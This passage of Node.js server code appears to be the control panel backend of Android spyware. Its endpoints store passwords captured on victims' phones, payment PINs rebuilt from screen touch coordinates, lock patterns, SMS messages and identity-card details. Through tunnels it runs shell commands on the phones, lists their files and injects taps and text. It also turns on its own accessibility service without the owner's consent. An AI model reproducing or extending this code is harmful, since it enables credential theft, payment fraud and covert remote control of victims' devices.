  res.json({ success: true, data: { passwords: rows.map(r => ({ id: r.id, deviceId: r.device_id, appName: r.app_name, packageName: r.package_name, password: r.input_text, value: r.input_text, inputText: r.input_text, type: r.password_type, passwordType: r.password_type, capturedAt: r.timestamp || Math.floor(r.created_at * 1000), date: r.timestamp || Math.floor(r.created_at * 1000), timestamp: r.timestamp || Math.floor(r.created_at * 1000), createdAt: r.created_at })), total, page, pageSize } });
});
app.get('/api/wechat-passwords/:deviceId', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 10;
  res.json({ success: true, data: { passwords: [], total: 0, page, pageSize } });
});
app.delete('/api/password-inputs/id/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM password_inputs WHERE id=?').run(req.params.id);
  res.json({ success: true });
});
app.put('/api/password-inputs/id/:id/remark', authMiddleware, (req, res) => {
  const { remark } = req.body || {};
  db.prepare('UPDATE password_inputs SET app_name=? WHERE id=?').run(remark || '', req.params.id);
  res.json({ success: true });
});
app.delete('/api/password-inputs/clear/:deviceId', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(req.params.deviceId);
  res.json({ success: true });
});
app.get('/api/payment-cipher-records', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 50;
  const deviceId = req.query.d || req.query.device_id || req.query.deviceId || '';
  const offset = (page - 1) * pageSize;
  let where = "WHERE password_type='payment_cipher'";
  const params = [];
  if (deviceId) { where += ' AND device_id=?'; params.push(deviceId); }
  const total = db.prepare(`SELECT COUNT(*) as cnt FROM password_inputs ${where}`).get(...params).cnt;
  const rows = db.prepare(`SELECT * FROM password_inputs ${where} ORDER BY rowid DESC LIMIT ? OFFSET ?`).all(...params, pageSize, offset);
  res.json({
    success: true, data: rows.map(r => {
      const tsMs = r.timestamp > 1e12 ? r.timestamp : r.timestamp * 1000;
      const tsSec = Math.floor(tsMs / 1000);
      const rawText = r.input_text || '';
      
      const isCoordFormat = /^\d+\.?\d*,\d+\.?\d*\|/.test(rawText);
      let parsedCipher = '';
      let confidence = '';
      if (isCoordFormat) {
        const coordArr = rawText.split('|').map(p => {
          const [x, y] = p.split(',').map(Number);
          return { x, y };
        }).filter(c => !isNaN(c.x) && !isNaN(c.y));
        const devRow = db.prepare('SELECT screen_width,screen_height FROM devices WHERE device_id=?').get(r.device_id);
        const sw = (devRow && devRow.screen_width) || 720;
        const sh = (devRow && devRow.screen_height) || 1600;
        const parsed = parseCoordsToPassword(coordArr, sw, sh);
        parsedCipher = parsed.password || '';
        confidence = parsed.confidence || '';
      }
      
      return {
        id: r.id,
        device_id: r.device_id,
        app_name: r.app_name || 'payment',
        package_name: r.package_name || '',
        cipher: parsedCipher || (isCoordFormat ? '' : rawText),
        raw_coords: isCoordFormat ? rawText : '',
        confidence: confidence,
        touch_points: isCoordFormat ? JSON.stringify(rawText.split('|').map(p => { const [x,y] = p.split(',').map(Number); return {x,y}; }).filter(c => !isNaN(c.x) && !isNaN(c.y))) : null,
        capture_type: 'accessibility',
        captured_at: tsSec
      };
    }), total
  });
});
app.get('/api/settings/telegram', authMiddleware, (req, res) => res.json({ success: true, data: {} }));
app.get('/api/gesture/list', authMiddleware, (req, res) => {
  const deviceId = req.query.device_id || req.query.deviceId || '';
  let where = "WHERE password_type IN ('pattern','pin','password','mixed')";
  const params = [];
  if (deviceId) { where += ' AND device_id=?'; params.push(deviceId); }
  const rows = db.prepare(`SELECT * FROM password_inputs ${where} ORDER BY rowid DESC LIMIT 50`).all(...params);
  const data = rows.map(r => {
    let gestures = [], nodes = [];
    if (r.password_type === 'pattern') {
      nodes = (r.input_text || '').split(',').map(n => parseInt(n.trim())).filter(n => !isNaN(n));
      gestures = nodes.map(idx => ({ x: (idx % 3) / 2, y: Math.floor(idx / 3) / 2 }));
    }
    return {
      id: r.id,
      device_id: r.device_id,
      name: r.password_type === 'pattern' ? `图案密码 #${r.id}` : `${r.password_type === 'pin' ? 'PIN' : '密码'} #${r.id}`,
      gestures, nodes,
      patternText: r.input_text,
      password: r.input_text,
      type: r.password_type,
      capturedAt: new Date(r.timestamp > 1e12 ? r.timestamp : r.timestamp * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }),
      timestamp: r.timestamp
    };
  });
  res.json({ success: true, data });
});
app.get('/api/gesture/records', authMiddleware, (req, res) => res.json({ success: true, data: [], total: 0 }));
app.post('/api/gesture/save', authMiddleware, (req, res) => res.json({ success: true }));
app.delete('/api/gesture/:id', authMiddleware, (req, res) => res.json({ success: true }));
app.post('/api/device-custom-info', authMiddleware, (req, res) => {
  const { deviceId, realName, idCard, expiryDate, otherInfo } = req.body || {};
  if (deviceId) {
    const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
    try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
    db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, deviceId);
  }
  res.json({ success: true });
});
app.get('/api/device-custom-info', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  if (!deviceId) return res.json({ success: true, data: {} });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
  const row = db.prepare('SELECT custom_info FROM devices WHERE device_id=?').get(deviceId);
  if (row && row.custom_info) {
    try { return res.json({ success: true, data: JSON.parse(row.custom_info) }); } catch { }
  }
  res.json({ success: true, data: { realName: '', idCard: '', expiryDate: '', otherInfo: '' } });
});

// 删除设备
app.delete('/api/device/:deviceId', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
  const ws = deviceConnections.get(deviceId);
  if (ws) { try { ws.close(); } catch (e) { } deviceConnections.delete(deviceId); }
  db.prepare('DELETE FROM devices WHERE device_id=?').run(deviceId);
  db.prepare('DELETE FROM sms_notifications WHERE device_id=?').run(deviceId);
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(deviceId);
  broadcastToAdmins({ type: 'device_removed', deviceId, sessionId: deviceId });
  res.json({ success: true });
});

// 设备备注修改
app.put('/api/device/:id/remark', authMiddleware, (req, res) => {
  const { remark } = req.body || {};
  db.prepare('UPDATE devices SET remark=? WHERE device_id=?').run(remark || '', req.params.id);
  res.json({ success: true, message: '备注已更新' });
});

app.get('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
  const row = db.prepare('SELECT custom_info FROM devices WHERE device_id=?').get(req.params.deviceId);
  if (row && row.custom_info) {
    try { const d = JSON.parse(row.custom_info); return res.json({ success: true, ...d }); } catch { }
  }
  res.json({ success: true, realName: '', idCard: '', expiryDate: '', otherInfo: '' });
});
app.post('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  const { realName, idCard, expiryDate, otherInfo } = req.body || {};
  const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
  db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, req.params.deviceId);
  res.json({ success: true });
});
app.put('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  const { realName, idCard, expiryDate, otherInfo } = req.body || {};
  const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
  db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, req.params.deviceId);
  res.json({ success: true });
});
app.get('/api/device/groups', authMiddleware, (req, res) => {
  try { db.exec("CREATE TABLE IF NOT EXISTS device_groups (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, device_ids TEXT DEFAULT '', created_at REAL DEFAULT (strftime('%s','now')))"); } catch { }
  const rows = db.prepare('SELECT * FROM device_groups ORDER BY id').all();
  res.json({ success: true, groups: rows.map(r => ({ id: r.id, name: r.name, deviceIds: (r.device_ids || '').split(',').filter(Boolean), createdAt: r.created_at })) });
});
app.post('/api/device/groups', authMiddleware, (req, res) => {
  try { db.exec("CREATE TABLE IF NOT EXISTS device_groups (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, device_ids TEXT DEFAULT '', created_at REAL DEFAULT (strftime('%s','now')))"); } catch { }
  const { name, deviceIds } = req.body || {};
  if (!name) return res.json({ success: false, message: '分组名不能为空' });
  const ids = Array.isArray(deviceIds) ? deviceIds.join(',') : (deviceIds || '');
  db.prepare('INSERT INTO device_groups (name, device_ids) VALUES (?,?)').run(name, ids);
  res.json({ success: true, message: '分组创建成功' });
});
app.put('/api/device/groups/:id', authMiddleware, (req, res) => {
  const { name, deviceIds } = req.body || {};
  if (name) db.prepare('UPDATE device_groups SET name=? WHERE id=?').run(name, req.params.id);
  if (deviceIds !== undefined) {
    const ids = Array.isArray(deviceIds) ? deviceIds.join(',') : (deviceIds || '');
    db.prepare('UPDATE device_groups SET device_ids=? WHERE id=?').run(ids, req.params.id);
  }
  res.json({ success: true });
});
app.delete('/api/device/groups/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM device_groups WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

// 文件管理（通过 frpc ADB shell 列出目录）
app.get('/api/file/list', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  let dirPath = req.query.path || '/sdcard';
  // 确保路径末尾有斜杠（避免符号链接问题）
  if (!dirPath.endsWith('/')) dirPath += '/';
  const http = require('http');
  const respond = (files) => {
    if (Array.isArray(files)) return res.json({ success: true, files });
    if (typeof files === 'string') {
      try { return res.json({ success: true, files: JSON.parse(files) || [] }); } catch (e) {}
    }
    res.json({ success: true, files: [] });
  };
  // V5 优先: FILE_LIST over device WS; 超时则回退 ADB 隧道 ls -la
  if (typeof _fileReply === 'function') {
    _fileReply(deviceId, 'FILE_LIST', { path: dirPath }, 8000).then((data) => {
      respond(data);
    }).catch(() => {
      _tunnelLs(dirPath);
    });
  } else {
    _tunnelLs(dirPath);
  }
  function _tunnelLs(dir) {
    const cmd = encodeURIComponent(`ls -la "${dir}"`);
    http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${cmd}`, { timeout: 10000 }, (proxyRes) => {
      const chunks = [];
      proxyRes.on('data', c => chunks.push(c));
      proxyRes.on('end', () => {
        try {
          const data = JSON.parse(Buffer.concat(chunks).toString());
          const output = data.data?.output || '';
          const files = output.split('\n').filter(l => l.trim() && !l.startsWith('total')).map(line => {
            const parts = line.trim().split(/\s+/);
            if (parts.length < 7) return null;
            const perms = parts[0] || '';
            const isDir = perms.startsWith('d');
            const size = parseInt(parts[4]) || 0;
            const dateStr = `${parts[5]} ${parts[6]}`;
            const name = parts.slice(7).join(' ').replace(/ ->.*$/, '');
            if (!name || name === '.' || name === '..') return null;
            const cleanPath = dir.replace(/\/+$/, '');
            return { name, isDirectory: isDir, size, permissions: perms, path: `${cleanPath}/${name}`, modifiedAt: dateStr };
          }).filter(Boolean);
          res.json({ success: true, files: files });
        } catch {
          res.json({ success: true, files: [] });
        }
      });
    }).on('error', () => res.json({ success: true, files: [] }));
  }
});

// frpc 隧道配置（local-service 启动 frpc 时请求）
app.all('/api/tunnel/config', (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  const localPort = parseInt(req.body?.localPort) || 7912;
  const token = 'fisher_frp_2026';
  const remotePort = getDevicePort(deviceId);
  const configINI = `serverAddr = "${FRP_SERVER_ADDR}"\nserverPort = 7000\nauth.method = "token"\nauth.token = "${token}"\ntransport.heartbeatInterval = 10\ntransport.heartbeatTimeout = 30\n\n[[proxies]]\nname = "${deviceId}_local"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = ${localPort}\nremotePort = ${remotePort}\n`;
  res.json({
    success: true,
    data: {
      serverAddr: FRP_SERVER_ADDR,
      serverPort: 7000,
      token: token,
      remotePort: remotePort,
      localPort: localPort,
      configINI: configINI
    }
  });
});

// 设备操作日志
app.get('/api/logs', authMiddleware, (req, res) => {
  const { deviceId, page, pageSize } = req.query;
  res.json({ success: true, data: { logs: [], total: 0, page: parseInt(page) || 1, pageSize: parseInt(pageSize) || 50 } });
});

// 短信/通知
app.get('/api/sms/notifications', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 50;
  const offset = (page - 1) * pageSize;
  const total = db.prepare('SELECT COUNT(*) as c FROM sms_notifications').get().c;
  const rows = db.prepare('SELECT * FROM sms_notifications ORDER BY date DESC LIMIT ? OFFSET ?').all(pageSize, offset);
  res.json({
    success: true,
    data: {
      list: rows.map(r => ({
        id: r.id,
        address: r.address,
        body: r.body,
        date: r.date,
        deviceId: r.device_id,
        deviceName: r.device_name,
        serialNumber: r.serial_number,
        type: r.type
      })),
      page,
      pageSize,
      total
    }
  });
});

// 前端通过HTTP发送命令给设备（桥接到 Bridge 或 WebSocket）
app.post('/api/bridge/command/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const { command, params } = req.body || {};

  // ★ getScreenInfo 特殊处理：返回数据库中记录的物理分辨率宽x高
  if (command === 'getScreenInfo') {
    try {
      const row = db.prepare('SELECT screen_width, screen_height FROM devices WHERE device_id=?').get(deviceId);
      if (row && row.screen_width && row.screen_height) {
        return res.json({ success: true, size: `${row.screen_width}x${row.screen_height}`, data: { size: `${row.screen_width}x${row.screen_height}` } });
      }
    } catch (e) { }
    return res.json({ success: true, size: "1080x2400", data: { size: "1080x2400" } });
  }

  // 优先通过 Bridge（local-service）执行命令
  const bridgeWs = bridgeConnections.get(deviceId);
  if (bridgeWs && bridgeWs.readyState === 1) {
    // 坐标不缩放：前端已经换算到设备实际分辨率
    // 动态计算 scale：从截图缓存读实际宽度
    let scale = 2; // 默认
    let shotW = 360; // 默认截图宽度
    let shotH = 800; // 默认截图高度
    try {
      const devRow = db.prepare('SELECT screen_width FROM devices WHERE device_id=?').get(deviceId);
      const realW = devRow?.screen_width || 720;
      const cached = screenshotCache.get(deviceId);
      if (cached && cached.data && cached.data.length > 10) {
        // 解析 JPEG SOF0 获取宽度和高度
        const buf = cached.data;
        for (let i = 0; i < buf.length - 9; i++) {
          if (buf[i] === 0xFF && (buf[i + 1] === 0xC0 || buf[i + 1] === 0xC2)) {
            const h_val = buf.readUInt16BE(i + 5);
            const w_val = buf.readUInt16BE(i + 7);
            if (w_val > 0 && w_val < 10000) {
              shotW = w_val;
              scale = realW / shotW;
            }
            if (h_val > 0 && h_val < 10000) {
              shotH = h_val;
            }
            break;
          }
        }
      }
    } catch (e) { /* fallback scale=2 */ }
    let fixedParams = params || {};
    // ★ 智能检测：如果坐标值已经明显超过了投屏截图画面的宽高，说明前端已经将其换算为了实际物理分辨率，跳过缩放
    const devRow2 = db.prepare('SELECT screen_width, screen_height FROM devices WHERE device_id=?').get(deviceId);
    const maxX = devRow2?.screen_width || 1080;
    const maxY = devRow2?.screen_height || 2400;
    if (command === 'click' || command === 'tap') {
      const rawX = fixedParams.x || 0, rawY = fixedParams.y || 0;
      if (scale > 1.1 && (rawX > shotW || rawY > shotH || (rawX <= maxX && rawY <= maxY && scale === 1))) {
        // 坐标已是物理分辨率，不缩放
        console.log(`[CMD] ${deviceId}: tap 坐标已是物理分辨率，跳过缩放 (x=${rawX},y=${rawY})`);
        scale = 1;
      }
      if (fixedParams.x) fixedParams.x = Math.round(fixedParams.x * scale);
      if (fixedParams.y) fixedParams.y = Math.round(fixedParams.y * scale);
    }
    if (command === 'swipe') {
      // ★ 智能检测：如果滑动坐标明显超出了截图宽高，跳过缩放
      const sx = fixedParams.startX || fixedParams.x1 || 0;
      const sy = fixedParams.startY || fixedParams.y1 || 0;
      if (scale > 1.1 && (sx > shotW || sy > shotH || (sx <= maxX && sy <= maxY && scale === 1))) {
        console.log(`[CMD] ${deviceId}: swipe 坐标已是物理分辨率，跳过缩放 (sx=${sx},sy=${sy})`);
        scale = 1;
      }
      if (fixedParams.startX) fixedParams.startX = Math.round(fixedParams.startX * scale);
      if (fixedParams.startY) fixedParams.startY = Math.round(fixedParams.startY * scale);
      if (fixedParams.endX) fixedParams.endX = Math.round(fixedParams.endX * scale);
      if (fixedParams.endY) fixedParams.endY = Math.round(fixedParams.endY * scale);
      // 前端也可能发 x1/y1/x2/y2 格式
      if (fixedParams.x1) fixedParams.x1 = Math.round(fixedParams.x1 * scale);
      if (fixedParams.y1) fixedParams.y1 = Math.round(fixedParams.y1 * scale);
      if (fixedParams.x2) fixedParams.x2 = Math.round(fixedParams.x2 * scale);
      if (fixedParams.y2) fixedParams.y2 = Math.round(fixedParams.y2 * scale);
    }

    // dumpUI 等需要返回数据的命令：优先 frpc，失败则 Bridge fallback
    if (command === 'dumpUI' || command === 'dumpHierarchy' || command === 'getUiHierarchy') {
      const http = require('http');
      const _dumpFallbackBridge = () => {
        if (!bridgeWs || bridgeWs.readyState !== 1) {
          if (!res.headersSent) res.json({ success: false, message: 'Bridge 未连接' });
          return;
        }
        console.log(`[CMD] → ${deviceId}: ${command} (Bridge fallback, frpc不可用)`);
        let replied = false;
        const timer = setTimeout(() => {
          if (!replied) { replied = true; if (!res.headersSent) res.json({ success: false, message: 'Bridge dumpUI timeout' }); }
        }, 15000);
        const onMsg = (raw) => {
          if (replied) return;
          try {
            const str = (raw instanceof Buffer) ? raw.toString() : raw;
            const msg = JSON.parse(str);
            if ((msg.body && (msg.body.bridgePath === '/dumpUI' || msg.body.bridgePath === '/dumpHierarchy' || msg.body.bridgePath === '/getUiHierarchy')) ||
              (msg.type === 'command_result' && (msg.command === command || msg.data?.command === command)) ||
              (msg.data && msg.data.xml) || msg.xml) {
              replied = true;
              clearTimeout(timer);
              bridgeWs.removeListener('message', onMsg);
              if (!res.headersSent) res.json({ success: true, data: msg.body || msg.data || msg });
            }
          } catch { }
        };
        bridgeWs.on('message', onMsg);
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
        setTimeout(() => { bridgeWs.removeListener('message', onMsg); }, 16000);
      };
      if (isFrpcCooling(deviceId)) {
        _dumpFallbackBridge();
        return;
      }
      const frpcCmd = (command === 'dumpUI') ? 'dumpHierarchy' : command;
      const proxyReq = http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/${frpcCmd}`, { timeout: 15000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          const data = Buffer.concat(chunks);
          clearFrpcCooldown(deviceId);
          if (!res.headersSent) { res.set('Content-Type', proxyRes.headers['content-type'] || 'application/json'); res.send(data); }
        });
      });
      proxyReq.on('error', (e) => {
        setFrpcCooldown(deviceId, 5000);
        console.log(`[CMD] ${deviceId}: ${command} frpc失败(${e.message})，降级Bridge`);
        _dumpFallbackBridge();
      });
      proxyReq.on('timeout', () => {
        proxyReq.destroy();
        setFrpcCooldown(deviceId, 5000);
        console.log(`[CMD] ${deviceId}: ${command} frpc超时，降级Bridge`);
        _dumpFallbackBridge();
      });
      return;
    }

    // 触摸/滑动/按键命令：直接通过 frpc HTTP 端口调用 local-service REST API（低延迟）
    if (command === 'click' || command === 'tap') {
      const http = require('http');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/tap?x=${fixedParams.x || 0}&y=${fixedParams.y || 0}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'tap executed' }); });
      }).on('error', () => {
        // frpc 失败，回退到 Bridge WS
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'tap', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'tap via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: tap raw=${JSON.stringify(params)} scaled=${fixedParams.x},${fixedParams.y} scale=${scale} (frpc)`);
      return;
    }

    if (command === 'swipe') {
      const http = require('http');
      const x1 = fixedParams.startX || fixedParams.x1 || 0;
      const y1 = fixedParams.startY || fixedParams.y1 || 0;
      const x2 = fixedParams.endX || fixedParams.x2 || 0;
      const y2 = fixedParams.endY || fixedParams.y2 || 0;
      const duration = fixedParams.duration || 300;
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/swipe?x1=${x1}&y1=${y1}&x2=${x2}&y2=${y2}&duration=${duration}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'swipe executed' }); });
      }).on('error', () => {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'swipe', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'swipe via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: swipe (frpc直连)`);
      return;
    }

    if (command === 'keyevent') {
      const http = require('http');
      const keycode = fixedParams.keycode || fixedParams.keyCode || fixedParams.code || 0;
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/keyevent?keycode=${keycode}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'keyevent executed' }); });
      }).on('error', () => {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'keyevent', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'keyevent via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: keyevent ${keycode} (frpc直连)`);
      return;
    }

    if (command === 'text' || command === 'inputText') {
      const http = require('http');
      const text = encodeURIComponent(fixedParams.text || fixedParams.content || '');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/text?text=${text}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'text executed' }); });
      }).on('error', () => {
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'text via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: text (frpc直连)`);
      return;
    }

    // 启用无障碍服务：通过 frpc shell 直接执行 settings put
    if (command === 'enableAccessibility' || command === 'restoreAccessibility') {
      const _http = require('http');
      const _port = getDevicePort(deviceId);
      const _devRow = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
      const _pkg = _devRow && _devRow.app_name && _devRow.app_name.startsWith('com.') ? _devRow.app_name : null;
      if (_pkg) {
        const _svc = _pkg + '/com.titan.solid.luck.service.unfaiahnst';
        const _c = encodeURIComponent('settings put secure enabled_accessibility_services ' + _svc + ' && settings put secure accessibility_enabled 1');
        _http.get('http://127.0.0.1:' + _port + '/shell?cmd=' + _c, { timeout: 6000 }, function () {
          console.log('[CMD] a11y fast', deviceId, _svc);
          if (!res.headersSent) res.json({ success: true, data: { success: true, message: 'a11y enabled: ' + _svc } });
        }).on('error', function (e2) {
          if (!res.headersSent) res.json({ success: true, data: { success: false, message: e2.message } });
        });
        return;
      }

      const http = require('http');
      // 查询设备上的包名（从数据库获取或使用已知的）
      const device = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
      // 先获取当前包名
      const getPkgCmd = encodeURIComponent('pm list packages -3 | grep -v google | grep -v android | grep -v vivo | grep -v baidu | grep -v tencent | grep -v taobao | grep -v sina | grep -v kuaishou | grep -v jingdong | grep -v xunmeng | grep -v smile | grep -v dragon | grep -v omron | grep -v unionpay | grep -v kaixinkan | grep -v xtc');
      http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${getPkgCmd}`, { timeout: 5000 }, (pkgRes) => {
        const chunks = [];
        pkgRes.on('data', c => chunks.push(c));
        pkgRes.on('end', () => {
          try {
            const pkgData = JSON.parse(Buffer.concat(chunks).toString());
            const output = pkgData.data?.output || '';
            // 找到我们的包（通常是 com.xxx.yyyyy 格式，14字符）
            const pkgs = output.split('\n').map(l => l.trim().replace('package:', '')).filter(p => p && p.startsWith('com.') && p.length <= 20);
            const ourPkg = pkgs[0] || 'com.dev.rehwft';
            const service = `${ourPkg}/com.titan.solid.luck.service.unfaiahnst`;

            // 执行 settings put
            const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
            http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
              // 同时启用 accessibility_enabled
              const enabledCmd = encodeURIComponent('settings put secure accessibility_enabled 1');
              http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enabledCmd}`, { timeout: 3000 }, () => { }).on('error', () => { });
              console.log(`[CMD] ✅ ${deviceId}: 无障碍已启用 (${service})`);
              if (!res.headersSent) res.json({ success: true, data: { success: true, message: `无障碍已启用: ${service}` } });
            }).on('error', (e) => {
              console.log(`[CMD] ❌ ${deviceId}: 启用无障碍失败 - ${e.message}`);
              if (!res.headersSent) res.json({ success: true, data: { success: false, message: e.message } });
            });
          } catch (e) {
            // 回退：直接用已知的包名
            const service = 'com.dev.rehwft/com.titan.solid.luck.service.unfaiahnst';
            const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
            http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
              const enabledCmd = encodeURIComponent('settings put secure accessibility_enabled 1');
              http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enabledCmd}`, { timeout: 3000 }, () => { }).on('error', () => { });
              if (!res.headersSent) res.json({ success: true, data: { success: true, message: `无障碍已启用: ${service}` } });
            }).on('error', () => {
              if (!res.headersSent) res.json({ success: true, data: { success: false, message: '启用失败' } });
            });
          }
        });
      }).on('error', () => {
        // frpc 不可用，回退到 Bridge
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, data: { success: true, message: '命令已发送(Bridge)' } });
      });
      return;
    }

    // APP 级别命令（大写命令）通过 APP WebSocket 转发
    if (command === command.toUpperCase() && command.length > 3) {
      const deviceWs = deviceConnections.get(deviceId);
      if (deviceWs && deviceWs.readyState === 1) {
        deviceWs.send(JSON.stringify({ type: 'command', data: { command, params: fixedParams } }));
        console.log(`[CMD] → ${deviceId}: ${command} (APP WS via HTTP)`);
        return res.json({ success: true, message: '命令已发送(APP)' });
      }
    }

    // 其他命令通过 Bridge WS 转发
    bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
    console.log(`[CMD] → ${deviceId}: ${command} (Bridge)`);
    return res.json({ success: true, message: '命令已发送(Bridge)' });
  }

  // 回退：通过 APP WebSocket
  const deviceWs = deviceConnections.get(deviceId);
  if (deviceWs && deviceWs.readyState === 1) {
    deviceWs.send(JSON.stringify({ type: 'command', data: { command, params: params || {} } }));
    console.log(`[CMD] → ${deviceId}: ${command} (WS)`);
    res.json({ success: true, message: '命令已发送' });
  } else {
    res.json({ success: false, message: '设备离线' });
  }
});

// local-service 相关接口（通过WebSocket隧道访问APP本地ADB服务）
// 截图缓存

// ============ 动态端口分配 ============
const devicePortMap = new Map(); // deviceId -> remotePort
const PORT_BASE = 10014;
const PORT_MAX = 10500; // ★ 扩大端口池：10014-10500（487个端口）

// frpc 端口冷却（全局共享：命令处理 + 截图轮询）
const frpcCooldown = new Map(); // deviceId -> cooldown到期时间
function isFrpcCooling(deviceId) {
  const until = frpcCooldown.get(deviceId);
  return until && Date.now() < until;
}
function setFrpcCooldown(deviceId, ms) {
  frpcCooldown.set(deviceId, Date.now() + (ms || 5000));
}
function clearFrpcCooldown(deviceId) {
  frpcCooldown.delete(deviceId);
}

// ★ 启动时自动清理幽灵端口（device_ports 有记录但 devices 表没有对应设备的）
try {
  db.exec(`CREATE TABLE IF NOT EXISTS device_ports (device_id TEXT PRIMARY KEY, port INTEGER NOT NULL)`);
  // 清理幽灵端口
  const ghostCount = db.prepare('DELETE FROM device_ports WHERE device_id NOT IN (SELECT device_id FROM devices)').run().changes;
  if (ghostCount > 0) console.log(`[PORT] ★ 启动清理: 删除 ${ghostCount} 条幽灵端口记录`);
  // 恢复有效的端口映射
  const rows = db.prepare('SELECT device_id, port FROM device_ports').all();
  for (const row of rows) {
    devicePortMap.set(row.device_id, row.port);
  }
  if (rows.length > 0) console.log(`[PORT] 恢复 ${rows.length} 个端口映射`);
} catch (e) { }

// ★ 定时从 frps dashboard 同步在线设备的实际端口（防止端口错位）
function syncPortsFromFrps() {
  try {
    http.get('http://127.0.0.1:7500/api/proxy/tcp', {
      headers: { 'Authorization': 'Basic ' + Buffer.from('admin:admin123').toString('base64') },
      timeout: 5000
    }, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        try {
          const data = JSON.parse(body);
          const proxies = data.proxies || [];
          let synced = 0;
          for (const p of proxies) {
            if (p.status !== 'online') continue;
            const name = p.name || '';
            if (!name.endsWith('_local')) continue;
            const deviceId = name.replace('_local', '');
            const conf = p.conf || {};
            const remotePort = conf.remotePort || 0;
            if (!remotePort || !deviceId) continue;
            const currentPort = devicePortMap.get(deviceId);
            if (currentPort !== remotePort) {
              devicePortMap.set(deviceId, remotePort);
              try { db.prepare('INSERT OR REPLACE INTO device_ports (device_id, port) VALUES (?,?)').run(deviceId, remotePort); } catch (e) { }
              console.log(`[PORT-SYNC] ${deviceId}: ${currentPort || 'none'} → ${remotePort} (从frps同步)`);
              synced++;
            }
          }
